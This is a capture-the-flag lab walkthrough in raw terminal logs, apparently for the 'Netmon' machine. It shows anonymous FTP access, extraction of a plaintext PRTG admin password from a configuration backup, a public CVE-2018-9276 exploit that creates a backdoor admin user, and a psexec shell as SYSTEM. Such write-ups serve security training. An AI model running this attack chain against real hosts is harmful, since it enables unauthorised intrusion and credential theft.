```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-23 00:52 EST
Nmap scan report for 10.10.10.152
Host is up (0.35s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/23%OT=21%CT=1%CU=37705%PV=Y%DS=2%DC=T%G=Y%TM=6215CCF
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=101%TI=I%CI=I%TS=A)SEQ(SP=FA
OS:%GCD=1%ISR=100%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M54BNW8ST11%O2=M54BNW8ST1
OS:1%O3=M54BNW8NNT11%O4=M54BNW8ST11%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=2000%
OS:W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54BN
OS:W8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T
OS:4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-23T06:02:07
|_  start_date: 2022-02-23T05:55:51
|_clock-skew: mean: 4m01s, deviation: 0s, median: 4m00s

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   220.27 ms 10.10.16.1
2   449.65 ms 10.10.10.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 315.44 seconds
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ftp 10.10.10.152                                                                                                                                                                   130 ⨯
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  10:44PM       <DIR>          Administrator
02-02-19  11:35PM       <DIR>          Public
226 Transfer complete.
ftp> cd Administrator
550 Access is denied. 
ftp> cd Public
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
02-23-22  12:56AM                   34 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
34 bytes received in 0.22 secs (0.1529 kB/s)
ftp> 
221 Goodbye.
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~]
└─$ cat user.txt               
e2780575a4614d4d503d3c171b023190
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.152                                                                                                                                                            1 ⨯
Enter WORKGROUP\kali's password: 
session setup failed: NT_STATUS_ACCESS_DENIED

┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.152 -U Administrator                                                                                                                                           1 ⨯
Enter WORKGROUP\Administrator's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit prtg  
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                       | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                      | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                                   | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                                    | java/webapps/34108.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ git clone https://github.com/titanssystems/PRTG-Exploit.git                                                           
Cloning into 'PRTG-Exploit'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 11 (delta 1), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (11/11), done.
Resolving deltas: 100% (1/1), done.

┌──(thatvirdiguy㉿kali)-[~]
└─$ cd PRTG-Exploit 
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/PRTG-Exploit]
└─$ ls
PRTG.py  README.md
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/PRTG-Exploit]
└─$ python3 PRTG.py --help                                               
usage: PRTG.py [-h] [--url URL] [--count COUNT]

Get Information From PRTG Server.

optional arguments:
  -h, --help     show this help message and exit
  --url URL      The URL of the Server
  --count COUNT  Number of requests
  
┌──(thatvirdiguy㉿kali)-[~/PRTG-Exploit]
└─$ python3 PRTG.py --url http://10.10.10.152/
serverhttpurl :  http://netmon
dnsname :  netmon
edition :  PRTG Network Monitor Freeware (Trial Expired) <b class='edition-red'>(expired 11/23/2018)</b>
activated :  1
version :  18.1.37.13946
activationcolor :  Green
activesessions :  (Tag activesessions unknown)
windowsversion :  Microsoft Windows Server 2016 Standard (10.0 Build 14393), 1 CPUs (Single x64 Model 1 Step 2), code page "Windows-1252", on VMware
systemid :  SYSTEMID-FXTGO6D2-5I6IR6YQ-VVF4CU5P-ORLDXP4G-UUUC4CQA
GUID :  050A8AC5-586A-41AC-9581-4CA194FF1FDC
prtghost :  9AC054D7
loadvaluelookups :  
activationtime :  2/2/2019 11:15:47 PM
maintenancedate :  (Visible for system administrators only)
startinfo :  12:56:42 AM Init License
probes :  <tr><td width="99%"><p><b>Probe #1 "Local Probe"</b></p><p>connected from: 127.0.0.1:49674<br>Last Data: 2/23/2022 1:14:17 AM (1 sec ago) (Eastern Standard Time)<br>.NET Framework Support: Installed: v4\Client (4.6.01586), v4\Full (4.6.01586), v4.0\Client (4.0.0.0)</p></td><td></td></tr>
messagecount :  337
lastsync :  2/23/2022 12:57:33 AM (Nothing to do, Timing:16/0/0/267/845/1656)
rawbuffercount :  0 (OK)
warnings :  None
probewarnings :  []
repruncount :  0
editiontype :  F
daysinstalled :  1117
commercialdaysleft :  -999999
changepassword :  
licensehash :  
cpuload :  92%
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                                                                                
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                                                                                
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                                                                                
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                                                                                
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
                                                                                                                                                                                             

       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search

msf6 > search prtg 

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/http/prtg_authenticated_rce  2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/prtg_authenticated_rce

msf6 > info 0

       Name: PRTG Network Monitor Authenticated RCE
     Module: exploit/windows/http/prtg_authenticated_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2018-06-25

Provided by:
  Josh Berry <josh.berry@codewatch.org>
  Julien Bedel <contact@julienbedel.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic Targeting

Check supported:
  Yes

Basic options:
  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  ADMIN_PASSWORD  prtgadmin        yes       The password for the specified username
  ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
  Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT           80               yes       The target port (TCP)
  SSL             false            no        Negotiate SSL/TLS for outgoing connections
  VHOST                            no        HTTP server virtual host

Payload information:

Description:
  Notifications can be created by an authenticated user and can 
  execute scripts when triggered. Due to a poorly validated input on 
  the script name, it is possible to chain it with a user-supplied 
  command allowing command execution under the context of privileged 
  user. The module uses provided credentials to log in to the web 
  interface, then creates and triggers a malicious notification to 
  perform RCE using a Powershell payload. It may require a few tries 
  to get a shell because notifications are queued up on the server. 
  This vulnerability affects versions prior to 18.2.39. See references 
  for more details about the vulnerability allowing RCE.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2018-9276
  https://www.codewatch.org/blog/?p=453

msf6 >
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
200 PORT command successful.
150 Opening ASCII mode data connection.
11-20-16  09:46PM       <DIR>          $RECYCLE.BIN
02-02-19  11:18PM                 1024 .rnd
11-20-16  08:59PM               389408 bootmgr
07-16-16  08:10AM                    1 BOOTNXT
02-03-19  07:05AM       <DIR>          Documents and Settings
02-25-19  09:15PM       <DIR>          inetpub
02-23-22  12:55AM            738197504 pagefile.sys
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
12-15-21  09:40AM       <DIR>          ProgramData
02-03-19  07:05AM       <DIR>          Recovery
02-03-19  07:04AM       <DIR>          System Volume Information
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  10:44PM       <DIR>          Administrator
07-16-16  08:28AM       <DIR>          All Users
02-03-19  07:05AM       <DIR>          Default
07-16-16  08:28AM       <DIR>          Default User
07-16-16  08:16AM                  174 desktop.ini
02-02-19  11:35PM       <DIR>          Public
226 Transfer complete.
ftp> cd "All Users"
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  07:05AM       <DIR>          Application Data
12-15-21  09:40AM       <DIR>          Corefig
02-03-19  07:05AM       <DIR>          Desktop
02-03-19  07:05AM       <DIR>          Documents
02-02-19  11:15PM       <DIR>          Licenses
11-20-16  09:36PM       <DIR>          Microsoft
02-02-19  11:18PM       <DIR>          Paessler
02-03-19  07:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  08:18AM       <DIR>          SoftwareDistribution
02-03-19  07:05AM       <DIR>          Start Menu
02-02-19  11:15PM       <DIR>          TEMP
02-03-19  07:05AM       <DIR>          Templates
11-20-16  09:19PM       <DIR>          USOPrivate
11-20-16  09:19PM       <DIR>          USOShared
02-25-19  09:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd Paessler
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-23-22  01:37AM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
12-15-21  07:23AM       <DIR>          Configuration Auto-Backups
02-23-22  12:57AM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
02-23-22  12:57AM       <DIR>          Logs (Web Server)
02-23-22  01:01AM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
02-23-22  01:37AM              1678619 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
ftp> get PRTG*
local: PRTG Configuration.dat remote: PRTG*
200 PORT command successful.
550 The filename, directory name, or volume label syntax is incorrect. 
ftp> mget PRTG*
mget PRTG Configuration.dat? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 4.63 secs (250.9161 kB/s)
mget PRTG Configuration.old? y
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
1189697 bytes received in 4.61 secs (251.8740 kB/s)
mget PRTG Configuration.old.bak? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 4.58 secs (245.7580 kB/s)
mget PRTG Graph Data Cache.dat? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1065 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
1678619 bytes received in 6.17 secs (265.5951 kB/s)
ftp> 
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ cat 'PRTG Configuration.old.bak' | grep -A2 -B2 -i prtg 
<?xml version="1.0" encoding="UTF-8"?>
  <root version="16" oct="PRTG Network Monitor 18.1.37.13946" saved="7/14/2018 3:13:37 AM" max="2016" guid="{221B25D6-9282-418B-8364-F59561032EE3}" treeversion="0" created="2019-02-02-23-18-27" trial="42f234beedd545338910317db1fca74dbe84030f">
    <statistics time="03-02-2019 18:43:05">
      <statistic name="State Changes">
--
            </dbcredentials>
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
--
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ git clone https://github.com/chcx/PRTG-Network-Monitor-RCE.git                                                        
Cloning into 'PRTG-Network-Monitor-RCE'...
remote: Enumerating objects: 9, done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 9
Receiving objects: 100% (9/9), 4.07 KiB | 1.36 MiB/s, done.

┌──(thatvirdiguy㉿kali)-[~]
└─$ cd 'PRTG-Network-Monitor-RCE'                                                                                                                                                      130 ⨯
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/PRTG-Network-Monitor-RCE]
└─$ ls
prtg-exploit.sh  README.md

┌──(thatvirdiguy㉿kali)-[~/PRTG-Network-Monitor-RCE]
└─$ chmod +x prtg-exploit.sh

┌──(thatvirdiguy㉿kali)-[~/PRTG-Network-Monitor-RCE]
└─$ ./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=ezBGNTQyRERFLTVFQjktNDg3MC1BQTc1LTgwMEVENDRFNURGOH0%3D; _gat=1"

[+]#########################################################################[+] 
[*] PRTG RCE script by M4LV0                                                [*] 
[+]#########################################################################[+] 
[*] https://github.com/M4LV0                                                [*] 
[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution  CVE-2018-9276 [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and add it to the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'                                                                                         

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
 
```
 
```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.152 -U pentest        
Enter WORKGROUP\pentest's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.152\\ADMIN$ -U pentest
session setup failed: NT_STATUS_LOGON_FAILURE
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.152\\ADMIN$ -U DOMAIN/pentest                                                                                                                              1 ⨯
session setup failed: NT_STATUS_LOGON_FAILURE
```

```
┌──(thatvirdiguy㉿kali)-[~/impacket/examples]
└─$ python3 psexec.py pentest@10.10.10.152
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file tNpYPVRZ.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service nFOo on 10.10.10.152.....
[*] Starting service nFOo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users
 
C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 0EF5-E5E5

 Directory of C:\Users

02/03/2019  07:08 AM    <DIR>          .
02/03/2019  07:08 AM    <DIR>          ..
02/25/2019  10:44 PM    <DIR>          Administrator
02/23/2022  02:56 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   6,765,756,416 bytes free

C:\Users> cd Administrator
 
C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 0EF5-E5E5

 Directory of C:\Users\Administrator

02/25/2019  10:58 PM    <DIR>          .
02/25/2019  10:58 PM    <DIR>          ..
02/03/2019  07:08 AM    <DIR>          Contacts
02/02/2019  11:35 PM    <DIR>          Desktop
02/03/2019  07:08 AM    <DIR>          Documents
02/03/2019  07:08 AM    <DIR>          Downloads
02/03/2019  07:08 AM    <DIR>          Favorites
02/03/2019  07:08 AM    <DIR>          Links
02/03/2019  07:08 AM    <DIR>          Music
02/03/2019  07:08 AM    <DIR>          Pictures
02/03/2019  07:08 AM    <DIR>          Saved Games
02/03/2019  07:08 AM    <DIR>          Searches
02/25/2019  10:06 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   6,765,486,080 bytes free

C:\Users\Administrator> cd Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 0EF5-E5E5

 Directory of C:\Users\Administrator\Desktop

02/02/2019  11:35 PM    <DIR>          .
02/02/2019  11:35 PM    <DIR>          ..
02/23/2022  02:41 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,765,486,080 bytes free

C:\Users\Administrator\Desktop> type root.txt
7280a8b9a7076a400637911e0276b799

C:\Users\Administrator\Desktop> 
```
